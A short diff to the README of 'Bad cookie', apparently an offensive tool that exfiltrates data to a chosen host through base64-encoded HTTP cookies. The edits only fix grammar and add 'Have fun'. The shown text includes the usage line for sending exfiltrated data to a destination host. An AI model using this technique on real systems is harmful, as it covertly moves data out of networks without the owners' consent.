@@ -16,7 +16,7 @@ Bad cookie exfiltrates data via base64 encoded HTTP cookies.
 #Things to keep in mind
 * The script transmits data via http not https
 * Base64 encoded data can be easily decoded
-* Be mindful the cookie size 
+* Be mindful of the cookie size 
 
 #Usage
 `badcookie.py <destination_host> <exfiltrated_data>`
@@ -42,3 +42,5 @@ Bad cookie exfiltrates data via base64 encoded HTTP cookies.
 * You can now decode the base64 encoded data.
 
 * Please note that the above process is just a suggestion, you can setup the exfiltration process anyway you like.
+
+* Have fun
